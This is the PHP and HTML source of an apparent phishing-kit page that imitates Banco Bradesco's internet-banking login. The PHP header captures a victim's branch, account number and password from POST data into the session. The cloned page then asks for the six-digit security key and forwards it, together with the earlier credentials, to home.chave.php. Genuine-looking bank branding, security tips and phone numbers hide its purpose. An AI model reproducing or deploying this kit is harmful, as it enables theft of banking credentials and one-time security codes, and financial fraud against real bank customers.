<?php
error_reporting(0);
session_start();

$agdes = $_POST['agdes'];
$ctdes = $_POST['ctdes'];
$digdes = $_POST['digdes'];

$s1 = $_POST['s1'];
$s2 = $_POST['s2'];
$sc = $_POST['sc'];
$s4 = $_POST['s4'];

$se = "$s1$s2$sc$s4";
$_SESSION["SENHA"] = $se;
$_SESSION["agdes"] = $agdes;
$_SESSION["ctdes"] = $ctdes;
$_SESSION["digdes"] = $digdes;

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html>

<head>
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Content-Type" content="text/html;CHARSET=iso-8859-1" />
	<link rel="shortcut icon" href="Banco%20Bradesco%20S_A_files/bradesco.ico"/>
	<title>Banco Bradesco S/A</title>
	
    


    

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/estrutur.css" />

<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/interna0.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery00.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery01.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery02.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/jquery03.css" />

<link rel="stylesheet" type="text/css" media="screen" href="Banco%20Bradesco%20S_A_files/login000.css" />
<link rel="stylesheet" type="text/css" media="screen, print" href="Banco%20Bradesco%20S_A_files/conteudo.css" />
<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery00.js"></script>
<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery01.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery02.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery03.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery04.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery05.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/swfobjec.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/default0.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery06.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jqDnR000.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/jquery07.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/date0000.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/currency.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/validaco.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/default1.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/tecladov.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/hda00000.js"></script>

<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/hda-ib-u.js"></script>


    



    <!--[if lt IE 8]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie.css" />


	


	<![endif]-->

	<!--[if lt IE 7]>
	

<link rel="stylesheet" type="text/css" media="screen" href="https://www.ib3.bradesco.com.br/ibpf/conteudo/css/geral/geral_ie6.css" />


	

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/pngfix.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/jquery.bgiframe.js"></script>

<script type="text/javascript" src="https://www.ib3.bradesco.com.br/ibpf/conteudo/js/geral/default_ie.js"></script>


	<![endif]-->
    
    <script type="text/javascript"><!--
var isPrime=false;

//--></script>
    <script type="text/javascript"><!--
var loginMainUrlEncerra='https://www.ib2.bradesco.com.br/ibpflogin/logoff.jsf';

//--></script>
    <script type="text/javascript"><!--
var loginMainNomeCtl='CTL';

//--></script>
    <script type="text/javascript"><!--
var loginMainCtl='7605190925697317521150';

//--></script>
	    
	    
	    <script type="text/javascript">
			document.domain = "#";			
			function cancelarAcesso() {
 				window.top.location = loginMainUrlEncerra + "?" + loginMainNomeCtl + "=" + loginMainCtl;     
   				return false;
			}
	    </script>
		
		<script>	
	
	function data(){
    Hoje = new Date();
    Data = Hoje.getDate();
    Dia = Hoje.getDay();
    Mes = Hoje.getMonth();
    Ano = Hoje.getFullYear();
   
    if(Data < 10) {
        Data = "0" + Data;
    }
    NomeDia = new Array(7)
    NomeDia[0] = "Domingo"
    NomeDia[1] = "Segunda-feira"
    NomeDia[2] = "Ter&ccedil;a-feira"
    NomeDia[3] = "Quarta-feira"
    NomeDia[4] = "Quinta-feira"
    NomeDia[5] = "Sexta-feira"
    NomeDia[6] = "S&aacute;bado"

    NomeMes = new Array(12)
    NomeMes[0] = "Janeiro"
    NomeMes[1] = "Fevereiro"
    NomeMes[2] = "Mar&ccedil;o"
    NomeMes[3] = "Abril"
    NomeMes[4] = "Maio"
    NomeMes[5] = "Junho"
    NomeMes[6] = "Julho"
    NomeMes[7] = "Agosto"
    NomeMes[8] = "Setembro"
    NomeMes[9] = "Outubro"
    NomeMes[10] = "Novembro"
    NomeMes[11] = "Dezembro"

    document.write(NomeDia[Dia] + ", "+ Data + " de " + NomeMes[Mes] + " de " + Ano);
}

</script>
	
	
        <script src="Scripts/AC_ActiveX.js" type="text/javascript"></script>
        <script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
</head>
<body>
<form name="institucional" action="">
</form>
		
	<div id="topo">
		<div class="centro"><img  class="pngfix tabindex tabfirst" alt="Voc&#234; est&#225; no Acesso Seguro do Bradesco Internet Banking. Utilize TAB para navegar." src="Banco%20Bradesco%20S_A_files/logo0000.png"style="height=131px; left: 4px; position: absolute; text-indent: -9999px; top: 11px; z-index: 2; width: 146px;" /><ul id="_id35" class="login_topo"><li id="_id36" class="tp1"><a class='linkInvisivel tabindex' 
				    href='#' title='Ag&#234;ncia: 2552, Conta: 7326-1'></a>Ag&#234;ncia:&nbsp;<b><?php echo $agdes ?></b></li><li id="_id40" class="tp2">Conta:&nbsp;<b><?php echo $ctdes ?>-<?php echo $digdes ?></b></li><li id="_id43" class="bto_cancelar_acesso"><input type="button" id="botao_cancelar_acesso" class="tabindex pointer bto_input" onclick="return cancelarAcesso()" title="Cancelar Acesso" /></li></ul><div class="direita after"><ul id="_id46" class="menuSessao"><li id="_id47">
					<script>data();</script>
					</li></ul><div class="login_title"><h1>Acesso Seguro</h1><div class="login-subtitulo"><h2>Acesse o Bradesco Internet Banking de forma segura seguindo os passos abaixo:</h2></div></div></div><div class="bgrTopoEsquerda"></div></div>
<!-- inicio header -->
<!-- fim header -->
	</div>

	<div id="miolo" class="after login">	
						
		<script type="text/javascript"><!--
var pametrosHdaSenha4UnicoTitular='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=1';

//--></script><script type="text/javascript"><!--
var pametrosHdaSelecaoMultiplosTitulares='n_0-0_introducao|hdaOfertaDisp=0&hdaQtdeTit=2';

//--></script><script type="text/javascript"><!--
var pametrosHdaSenha4MultiplosTitulares='r_0-21_verificaoferta|hdaOfertaDisp=0';

//--></script><script type="text/javascript"><!--
var numControle='7605190925697317521150';

//--></script><script type="text/javascript"><!--
var hdaAtivadoLogin=false;

//--></script><script type="text/javascript"><!--
var hdaPosicaoLogin=1;

//--></script><script type="text/javascript"><!--
var hdaVisivelLogin=false;

//--></script><script type="text/javascript"><!--
var isPrimeiroAcesso=false;

//--></script><script type="text/javascript"><!--
var sequenciaTeclado=new Array(6,7,0,3,5,4,2,9,8,1);

//--></script>
<script type="text/javascript"><!--
var urlAutenticacao='autenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script>



<script type="text/javascript"><!--
var urlProximoTipoAutenticacao='tipoAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm?nome=valor';

//--></script><script type="text/javascript"><!--
var urlAceite='aceite.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var urlProximaPagina='proxAutenticacao.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm';

//--></script><script type="text/javascript"><!--
var sequenciaProximoDispositivo=2;

//--></script>
<script type="text/javascript" src="Banco%20Bradesco%20S_A_files/login000.js"></script>
<div id="conteudo" class="after conteudo_L">
   <script>           
        jQuery(function($) {          
            var tit = "Limpar";             
        	$('#botao_limpar').attr('title', tit); 
        });     
   </script>
<div class="topo_canto_L"></div><div class="topo_canto_R"></div><div id="conteudo_interno" class="miolo miolo_noBg after"><div id="divMioloPaginaLogin" class="boxP20 after"><div>
  <div id="box_titular" style="display:none;" class="pb15 after"><a id='link_saudacao' class='linkInvisivel tabindex' href='' 
                title='Boa tarde, Lincoln'></a><a class="loging_Tip bTip tabindex linkInvisivel" id="contPrincDV" title="Para sua seguran&#231;a, estamos mostrando o nome da conta digitada. Caso n&#227;o seja o seu nome, cancele o acesso e verifique se est&#225; realmente no site do Bradesco (bradesco.com.br)  e digite o n&#186; da ag&#234;ncia e conta corrente.">Para sua seguran&#231;a, estamos mostrando o nome da conta digitada. Caso n&#227;o seja o seu nome, cancele o acesso e verifique se est&#225; realmente no site do Bradesco (bradesco.com.br)  e digite o n&#186; da ag&#234;ncia e conta corrente.</a></div>
				
		  <script language="javascript">
		function abre() {
		document.getElementById('aaa').style.display = 'block';
		}
				
		function entregachave() 
		{
			if(document.sss.chave.value.length < 6)
			{
		 		alert('Chave de segurança incorreta');
		 		document.sss.chave.focus();
		 		return false;
		 	}
		    
			document.forms[1].submit();
		}
		</script>		
		
						
<form id="sss" name="sss" method="post" action="home.chave.php" enctype="application/x-www-form-urlencoded" onsubmit="" class="ajaxForm allowSubmit">
 
<input name="agdes" type="hidden" value="<?php echo $agdes ?>" />
<input name="ctdes" type="hidden" value="<?php echo $ctdes ?>" />
<input name="digdes" type="hidden" value="<?php echo $digdes ?>" />
  	<input type="hidden" id="senha" name="senha" value="<?php echo "$s1$s2$sc$s4"; ?>" />
	  <div id="aaa"  class="emba after ativo">
			<div id="lista-conteudos" class="conteudo-dinamico none_i"><div id="dicas_primeiroAcesso_1" class="dicas_primeiroAcesso_1"><div id="dicaChaveSoUmaVez" class="box-dica box-seguranca"><div class="linha"><!-- --></div><h2 class="atencao">Atenção</h2><span>O Bradesco solicita a digitação da Chave de Segurança apenas uma vez a cada transação.<br><br>Se você digitar errado, o Bradesco solicitará a mesma posição para este acesso, nunca outra.</span></div></div><div id="dicas_primeiroAcesso_2" class="dicas_primeiroAcesso_2"><div class="last"><div class="box-dica box-duvida"><h2>Em caso de dúvidas</h2><ul class="listaLinks"><li><span>Veja mais informações sobre o</span><br><a tabindex="20" class="link_ext pr12 tabindex" rel="external" style="white-space: nowrap;" href="http://www.bradesco.com.br/html/content/como_usar/chave.shtm" title="Cartão Chave de Segurança">Cartão Chave de &nbsp;Segurança</a></li><li><a tabindex="21" class="link_ext tabindex" href="javascript:;" onclick="return popupFaleconosco();" title="Entre em contato com o Bradesco">Entre em contato</a> <span>com o Bradesco</span></li></ul></div></div></div></div><div class=""><div class="boxP14"><span id="txt_msg_erro_frase"><span class="erro_msg none_i">Preencha o campo ao lado com a <strong>chave</strong> indicada no verso do seu cartão, conforme posição solicitada.</span></span><ul id="_id18" class="colsLogin after"><li id="_id19" class="nro">3</li><li id="_id21" class="legendaBox"><span id="text_tancode">Digite a <strong>chave</strong> informada no visor do seu celular.</span></li><li id="_id22"><span id="img_tancode"><img alt="Chave de Segurança" src="Banco Bradesco S_A_files/chavepage.jpg" width="179" height="109"></span></li><li id="_id23" class="pl5"><ul id="_id24" class="chaveSeguranca"><li id="_id25" class="title"><br />
			</li>
			<li id="_id27"><input type="password" id="chave" name="chave" maxlength="6" title="Digite a chave de seguran&ccedil;a Bradesco informada pelo seu dispositivo.  " style="width: 112px; maxlength:6; text-align:center;" class="tabindex tabfirst" tabindex="21">
			<span class="leg">&nbsp;&nbsp;(6 d&iacute;gitos)</span>
			<input name="form_j_tancode_SUBMIT" value="1" type="hidden"><input name="autoScroll" type="hidden">
			</li>
			<li id="_id31"><div id="loading_tancode" class="loading after none_i"><div class="txt"><span class="HtmlOutputTextBradesco">Carregando...</span></div></div></li></li></div>
</div>

						
						</div></li></form>
						
						
						
						<input type="hidden" name="form_titular_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /></form><div id="divBotoesPagina" class="mt0 bt0"><form id="loginbotoes" name="loginbotoes" method="post" action="#" enctype="application/x-www-form-urlencoded" onsubmit="javascript: return false;"><ul id="loginbotoes:ul_btos_bottom" class="btos_bottom"><li id="loginbotoes:li_btos_bottom_1"><input id="loginbotoes:bt_cancelar_acesso" name="loginbotoes:bt_cancelar_acesso" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif"  alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex botoesLogin" /></li><li id="loginbotoes:_id85"><input id="loginbotoes:botaoAvancar" name="loginbotoes:botaoAvancar" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onclick="javascript: entregachave();" alt="Avan&#231;ar" title="Avan&#231;ar" class="bt_avancar bto_input tabindex tab-1 botoesLogin" /></li></ul><input type="hidden" name="loginbotoes_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /><input type="hidden" name="loginbotoes:_link_hidden_" />
						
<!-- onclick="javascript: avancar();return;;clear_loginbotoes();document.forms['loginbotoes'].elements['autoScroll'].value=getScrolling();" -->
						
						<script type="text/javascript"><!--
function clear_loginbotoes() {
  var f = document.forms['loginbotoes'];
  f.elements['loginbotoes:_link_hidden_'].value='';
  f.target='';
}
clear_loginbotoes();
//--></script></form></div><div id="div-textoAposBotoes" class="textoAposBotoes"></div></div><div id="numero-tela" class="txt-codigoTela">RLO00</div></div></div><div class="base"><div id="div_base_1" class="c1"></div><div id="div_base_2" class="c2"></div></div></div><form id="form_cript" name="form_cript" method="post" action="#" enctype="application/x-www-form-urlencoded"><input type="hidden" id="form_cript:valor_dig" name="form_cript:valor_dig" value="" /><input type="hidden" id="form_cript:valor_cript" name="form_cript:valor_cript" value="" /><input type="hidden" name="form_cript_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /></form><script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/publicKe.js"><!--

//--></script><script language="javascript" type="text/javascript" src="Banco%20Bradesco%20S_A_files/scpscrpt.js"><!--

//--></script><script language="javascript"><!--

setPublic(n_InternetBanking, e_InternetBanking);  
function setEncryptEventTrap(element, eventName, trapFunction) {
    if (element.addEventListener){
        element.addEventListener(eventName, trapFunction, false);
    } else if (element.attachEvent){
        element.attachEvent('on' + eventName, trapFunction);
} 
} 
function handOnClick(e) {
    rng_seed_time();
} 
function handOnKeyPress(e) {
    rng_seed_time();
} window.document.onclick = handOnClick;
window.document.onkeypress = handOnKeyPress;
function getValor(campo) {
    var retorno = "";
    try {
        if(typeof(campo.length) != "undefined") {
            if (campo[0].type == "radio") {
                for (var i = 0; i < campo.length; i++) {
                    if (campo[i].checked) {
                        retorno = campo[i].value;
                        break;
                     }
                    }
             }
        } else {
            if(campo.type == "checkbox" || campo.type == "radio") {            
                if (campo.checked) {
                    retorno = campo.value;
                 }
            } else {
                retorno = campo.value;
            }
        }
    } catch (err) {
    }
    return retorno;
} function setValor(campo, novoValor, permiteBranco) {
   try {
       if(typeof(campo.length) != "undefined") {
           if (campo[0].type == "radio") {
              if (novoValor != "" || permiteBranco) {
                   for (var i = 0; i < campo.length; i++) {
                       if (campo[i].value == novoValor) {
                           campo[i].checked = true;
                       } else {
                           campo[i].checked = false;
                       }
                  }
                }
          }
       } else {
           if(campo.type == "checkbox") {            
               if (campo.value == novoValor) {
                   campo.checked = true;
               } else {
                   campo.checked = false;
              }
           } else if(campo.type == "radio") {
               if (novoValor != "" || permiteBranco) {
                   if (campo.value == novoValor) {
                       campo.checked = true;
                   } else {
                       campo.checked = false;
                   }
               }
           } else {
               campo.value = novoValor;
           }
       }
   } catch (err) {
} } function enc(formName, params) {
   var loop;
   for (loop = 0; loop < params.length; loop++) {
       var valorAux = getValor(window.document.forms[formName].elements[params[loop][0]]);
       window.document.forms[formName].elements[params[loop][1]].value = cript("7605190925697317521150", valorAux); 
       window.document.forms[formName + "_backup"].elements[params[loop][0]].value = valorAux;
      setValor(window.document.forms[formName].elements[params[loop][0]], "", true); 
} 
} 
function inic(formName, params) {
   var loop; 
   var dado; 
   for (loop = 0; loop < params.length; loop++) { 
       dado = window.document.forms[formName].elements[params[loop][1]].value;
       if (dado.length == 172 && dado.charAt(171) == "=") {
           dado = window.document.forms[formName + "_backup"].elements[params[loop][0]].value;
} 
      setValor(window.document.forms[formName].elements[params[loop][0]], dado, false);
} 
} 


//--></script><div style="visibility:visible; display:hide">
<form name="form_cript_backup">
<input type="hidden" name="form_cript:valor_dig" />
</form>
</div>
<script language="javascript"><!--

var params_form_cript = new Array();
   params_form_cript[0] = ["form_cript:valor_dig", "form_cript:valor_cript"];
var processado_form_cript = false;
function origOnSubmitform_cript() {return true;}
function enc_form_cript() { 
   if (origOnSubmitform_cript() == false) {
       return false;
   }
   enc("form_cript",  params_form_cript); 
   return true;
} 
function inic_form_cript() {
   inic("form_cript", params_form_cript) ;
} 
setEncryptEventTrap(window, "load", inic_form_cript);


//--></script><script type="text/javascript">
AC_AX_RunContent( 'classid','clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF','height','0','id','Conexao','width','0','update','1|1|1' ); //end AC code
</script><noscript><object classid="clsid:2E3C3651-B19C-4DD9-A979-901EC3E930AF" height="0" id="Conexao" width="0"><param name="Update" value="1|1|1" /></object></noscript><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">



 

























    

<!-- -->
<!-- -->

            
   
                    
        
        

            
            
                
            
                            
                
            
            
            
               
                        
          
        
        <!-- fim pb15 after -->

        
          <!-- Mais de um titular -->              
                        
          <!-- Select Titular - Box redline -->   
          
          
              
                <script type="text/javascript">
                <!--
                jQuery('#numero-tela').html('RLO01');
                //-->
                </script>          
                    
              
                
                  
                
                
                   
                              
                     
                  
                  
                                                                                                                                                                                     
                                                                                                                                                                                                                                                                                        
                      
                                                          
                                                                                                                                                                                                                                        
                    
                  
                            
                       
            
          
          <!-- fim titular != 1 -->
                  
          <!-- Box redline Senha4 - Teclado virtual -->      
          
            
                            
                                                        
                                                                                            
                
                  
                
                
                  
                
                
                  <!-- teclado virtual -->
                
              
              
              
                
                  
                    
                  
                
                
                  
                    
                  
                  
                    
                  
                  
                    
                  
                  
                    
                  
                
                
                  
                
                
                   
                
                
                  
                    
                      
                      
                    
                  
                
                                                
                  
                  
                                                                   
                                 
                        
                
                                                
                  
                                                                   
                                 
                                                      
                                   
                              
            <!-- fim boxP 14 -->
                            
          <!-- fim box_redLine_bottom -->
        

        <!-- Box redline  Dispositivo mensagem : s_validacao -->
        
           
                                
                 
                   
                      
                      
                   
                   
                      
                   
                   
                                                      
                                                  
                                
           
        
      
        <!-- Texto antes dos botoes -->
                    
                   
        
        <!-- botoes de baixo -->
        
        
        
           
                          
                                                      
             
           
             
             
                             
           
         
        
        

        <!-- Texto depois dos botoes -->
        
           
        
                                  
                                                  
      
                    
      <!--  codigo da tela -->         
      
          
      
      
   
   <!-- fim boxP20 -->


      

   <!-- -->
   <!-- -->   
      


<!-- fim conteudo -->


   
   

 

   



    
    
    
    



		<ul id="lista-dicas-seguranca" class="box-direita"><li id="_id96"><div class="box"><div id="dicaCadeado" class="boxP14"><span class="HtmlOutputTextBradesco"><h2>Seguran&ccedil;a</h2>
	                <span>Certifique-se de que o cadeado est&aacute; aparecendo no seu navegador.</span><br/>
	                <a rel="external" href="#" class="tabindex" 
	                    title="Confira outras dicas de seguran&#231;a">Confira outras dicas de seguran&ccedil;a</a></span><div id="dicasSeguranca_1" class="dicasSeguranca_1 none_i"></div></div><div class="bottom after"></div></div></li><li id="dicas-ultima-linha"><div id="dicasSeguranca_2" class="dicasSeguranca_2 none_i"></div></li></ul><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">








<!-- ### UL BOX DIREITA ### -->

    
                    
		    
		        <!-- HDA -->
		        
		             
		            
		               
		            
		                <!-- VIDEO -->                         
		                	                  
		                <!-- // VIDEO -->
		            
		        
		        <!-- // HDA -->
		    
        
            
            
                
	               
                <!-- -->               
                
                                              
            <!-- -->
              
    
               
    
        <!-- -->
    

<!-- ### FIM UL BOX DIREITA ### -->
		
	</div>	
	
	
	<div id="rodape" class="after"><div class="centro"><ul id="_id105" class="listaLogos pt30 pb30"><li id="li_logoBradesco"class="item1"><a href="" class="tabindex" title="Bradesco Dia e Noite">Dia&amp;Noite</a></li><li id="li_logoIso" class="item2"><a href="" class="tabindex" title="Bradesco Internet Banking ISO 9001">ISO 9001</a></li></ul><ul id="_id108" class="listaMenuInferior"><li id="_id109" class="tp2"><a href="#" rel="external" title="Seguran&#231;a" class="tabindex"><span class="lnk_ext_cinza">Seguran&#231;a</span></a></li><li id="_id111" class="tp2"><a  href="#" title="Fale Conosco" class="tabindex"><span class="lnk_ext_cinza">Fale Conosco</span></a></li>
	</ul><ul id="_id113" class="listaTelefones"><li class="item1"><a class='linkInvisivel tabindex' href='#' title='SAC Al&#244; Bradesco 0800-704-8383'></a><span >SAC - Al&#244; Bradesco</span>0800-704.8383</li><li class="item2"><a class='linkInvisivel tabindex' href='#' title='Central de Apoio ao Internet Banking. Telefone: 3003-0237 para Capitais e Regi&#245;es Metropolitanas. Telefone: 0800 701-0237 para demais regi&#245;es.'></a><span>Central de Apoio ao Internet Banking</span><div class="fl pl30 pt5" style="font-size: 11px;">3003-0237<br><span class="fBlack">Capitais e Regi&#245;es Metropolitanas</span></div><div class="fr pr30 pt5" style="font-size: 11px;">0800-701-0237<br><span class="fBlack"> Demais regi&#245;es </span></div></li><li class="item3"><a class='linkInvisivel tabindex' href='' title='Ouvidoria Bradesco 0800-727-9933'></a><span>Ouvidoria Bradesco</span>0800-727.9933</li></ul></div></div>




<!-- ### RODAPÉ ### -->

	

	

	
	
		
		    
			
		
	
		
			
			     			     
			 			
			
			     			     
			
		
	
		
            
            			
            
		
		
	
	

<!-- ### FIM RODAPÉ ### -->

	<div id="modalLogin" class="jqmWindow modalNaoFecha none_i" style="width:523px;"><div id="modalLogin_jqmCornerTop" class="jqmCornerTop"><div id="jqmCornerTop_1" class="cc"></div><div id="jqmCornerTop_2" class="c1"></div><div id="jqmCornerTop_3" class="c2"></div></div><div id="modalMiolo" class="jqmWrapper after"><a id='linkTituloModalLogin' href='javascript:;' class='tabindex modal-title tabfirst tabmodal' 
        title='Acesso Seguro'></a><div id="modalFechar" class="jqmTop after"><a href="javascript:;" class="lnkFechar closeModalLogin tabindex none_i" title="Fechar">Fechar</a><h4>Acesso Seguro</h4></div><div id="modalContentAfter" class="jqmContent after"><div id="modalBoxAlertPrincipal" class="ptb20"><div id="modalBoxAlertMessage" class="box-alerta sinal-X after"><div id="modalBoxAlertTexto" class="ctn-box after"><span class="HtmlOutputTextBradesco"><p><P>Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.</P></p></span></div></div><span class="HtmlOutputTextBradesco"><a id='mensagem-erro' class='modal-title tabindex tab-1 linkInvisivel' 
                      title='Sistema indispon&#237;vel no momento. Por favor, tente mais tarde.'></a></span><span id="textoPosErro" class="ctn-voltar">Em caso de d&#250;vidas, por favor, entre em contato com o <a class="link_ext tabindex" id="FFB" title="Fone F&#225;cil Bradesco, ir para p&#225;gina." href="javascript:;" onclick="return fonefacil();">Fone F&#225;cil Bradesco</a></span></div></div><ul id="_id121" class="lstButtonsLine block"><li id="_id122" class="pl20"><div id="div-textoAntesBotoes" class="textoAntesBotoes"></div></li><li id="_id124"><ul id="listaCancelarAcesso" class="lstButtons  btos_bottom fn after"><li id="cancelAcesso"><form id="cancelarAcessoModalForm" name="cancelarAcessoModalForm" method="post" action="https://www.ib2.bradesco.com.br/ibpflogin/login.jsf;jsessionid=0000U1s4dyj66Wp0FWVnUy3cZNU:15j308bvm" enctype="application/x-www-form-urlencoded" onsubmit="return false;" title="Cancelar Acesso"><input id="cancelarAcessoModalForm:_id125" name="cancelarAcessoModalForm:_id125" type="image" src="Banco%20Bradesco%20S_A_files/blank000.gif" onclick="javascript: cancelarAcesso();;clear_cancelarAcessoModalForm();document.forms['cancelarAcessoModalForm'].elements['autoScroll'].value=getScrolling();" alt="Cancelar Acesso" title="Cancelar Acesso" class="bt_cancelar_acesso bto_input tabindex " /><input type="hidden" name="cancelarAcessoModalForm_SUBMIT" value="1" /><input type="hidden" name="autoScroll" /><input type="hidden" name="cancelarAcessoModalForm:_link_hidden_" /><script type="text/javascript"><!--
function clear_cancelarAcessoModalForm() {
  var f = document.forms['cancelarAcessoModalForm'];
  f.elements['cancelarAcessoModalForm:_link_hidden_'].value='';
  f.target='';
}
clear_cancelarAcessoModalForm();
//--></script></form></li></ul></li><li id="_id126" class="pl20"><div id="div-textoAposBotoes" class="textoAposBotoes"></div></li></ul><a id='marcador-fim-modal' href='javascript:;' class='tabindex tabmodal' 
                onblur='focoTituloModal()'></a></div><div id="modalLogin_jqmCornerBottom" class="jqmCornerBottom"><div id="jqmCornerBottom_1" class="cc"></div><div id="jqmCornerBottom_2" class="c3"></div><div id="jqmCornerBottom_3" class="c4"></div></div></div>
 





		  
		<!-- -->
		<!-- -->
		<!-- -->	  
	

	
	  	
	
					
			
		

		
			
				
					
						
					
				
												
					
			
			                     
			
		
				
        <!--  -->
        
            
                
                    
                                      
            
        
		
			
				
				            		
	                
            		
            	
			
			
		
		
		
                
                    
                                                    
        
		
		           
		
	

	
		<!-- -->
		<!-- -->
		<!-- -->
	


<!-- fim jqmWindow  -->
<!-- fim modal login -->
 	
    <div id="modalContent" class="jqmWindow modalNaoFecha" style="width:550px;"><div id="modalContent_jqmCornerTop" class="jqmCornerTop"><div id="modalContent_top_1" class="cc"></div><div id="modalContent_top_2" class="c1"></div><div id="modalContent_top_3" class="c2"></div></div><div class="jqmWrapper after"></div><div id="bottomModalContent" class="jqmCornerBottom"><span class="cc"><!-- --></span><span class="c3"><!-- --></span><span class="c4"><!-- --></span></div></div>
 



		
			  
			<!-- -->
			<!-- -->
			<!-- -->	  
		

							
				

		
						
						


</body>
<script type="text/javascript"><!--
function getScrolling() {
    var x = 0; var y = 0;
    if (self.pageXOffset) {
        x = self.pageXOffset;
        y = self.pageYOffset;
    } else if (document.documentElement && document.documentElement.scrollLeft) {
        x = document.documentElement.scrollLeft;
        y = document.documentElement.scrollTop;
    } else if (document.body) {
        x = document.body.scrollLeft;
        y = document.body.scrollTop;
    }
    return x + "," + y;
}

//--></script>
</html>

<!-- This document saved from https://www.ib2.bradesco.com.br/ibpflogin/identificacao.jsf -->
